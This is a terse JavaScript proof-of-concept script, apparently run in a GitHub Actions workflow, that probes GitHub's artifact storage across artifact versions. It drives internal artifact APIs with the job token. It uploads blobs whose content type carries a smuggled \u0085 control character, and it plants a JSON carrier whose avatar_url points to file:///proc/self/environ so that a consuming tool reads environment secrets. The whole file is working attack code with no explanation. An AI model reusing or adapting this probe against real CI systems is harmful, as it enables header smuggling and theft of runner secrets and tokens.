import {createHash} from 'node:crypto';
import http from 'node:http';
import https from 'node:https';
import {BlobClient} from '@azure/storage-blob';
import {internalArtifactTwirpClient} from '../node_modules/@actions/artifact/lib/internal/shared/artifact-twirp-client.js';
import {getBackendIdsFromToken} from '../node_modules/@actions/artifact/lib/internal/shared/util.js';
import {StringValue} from '../node_modules/@actions/artifact/lib/generated/index.js';
const ids=getBackendIdsFromToken();const client=internalArtifactTwirpClient({maxAttempts:1});
const repo=process.env.GITHUB_REPOSITORY,runId=process.env.GITHUB_RUN_ID,token=process.env.GITHUB_TOKEN;
const odd='\u0085application/json';const sha=b=>createHash('sha256').update(b).digest('hex');
function req(url,method='GET',body=null,headers={}){return new Promise((resolve,reject)=>{const t=new URL(url);const m=t.protocol==='https:'?https:http;const r=m.request(t,{method,headers,timeout:20000},res=>{const c=[];res.on('data',x=>c.push(x));res.on('end',()=>resolve({status:res.statusCode,headers:res.headers,rawHeaders:res.rawHeaders,body:Buffer.concat(c)}));});r.on('error',reject);r.on('timeout',()=>r.destroy(new Error('timeout')));if(body)r.write(body);r.end();});}
async function upload(url,bytes){await new BlobClient(url).getBlockBlobClient().uploadData(bytes,{blobHTTPHeaders:{blobContentType:odd}});}
for(let version=0;version<=7;version++){
  const rec={version};const name=`ver-${runId}-v${version}`;const placeholder=Buffer.from('{}');
  try{
    const created=await client.CreateArtifact({...ids,name,version,mimeType:StringValue.create({value:'application/json'})});
    rec.createOk=!!created.ok;
    if(!created.ok){console.log('VER',JSON.stringify(rec));continue;}
    await upload(created.signedUploadUrl,placeholder);
    const fin=await client.FinalizeArtifact({...ids,name,size:String(placeholder.length),hash:StringValue.create({value:'sha256:'+sha(placeholder)})});
    rec.finalOk=!!fin.ok;rec.id=String(fin.artifactId||'');
    if(!fin.ok){console.log('VER',JSON.stringify(rec));continue;}
    const carrier=Buffer.from(JSON.stringify({full_name:`${repo}/actions/artifacts/${rec.id}/zip`,owner:{login:'cassette',avatar_url:'file:///proc/self/environ'},description:'v'+version,stargazers_count:0}));
    await upload(created.signedUploadUrl,carrier);
    const api=await req(`https://api.github.com/repos/${repo}/actions/artifacts/${rec.id}/zip`,'GET',null,{Authorization:`Bearer ${token}`,Accept:'application/vnd.github.v3+json','User-Agent':'repo-cassette-verprobe'});
    rec.restStatus=api.status;
    if(api.headers.location){const u=new URL(api.headers.location);rec.sv=u.searchParams.get('sv');rec.sk=u.searchParams.get('skv');rec.rsct=u.searchParams.get('rsct');rec.rsctHex=Buffer.from(rec.rsct||'','latin1').toString('hex');const f=await req(api.headers.location);rec.finalStatus=f.status;rec.finalCtHex=Buffer.from(f.headers['content-type']||'','latin1').toString('hex');rec.bodyMatch=f.body.equals(carrier);}
  }catch(e){rec.error=String(e.message||e).slice(0,140);}
  console.log('VER',JSON.stringify(rec));
}
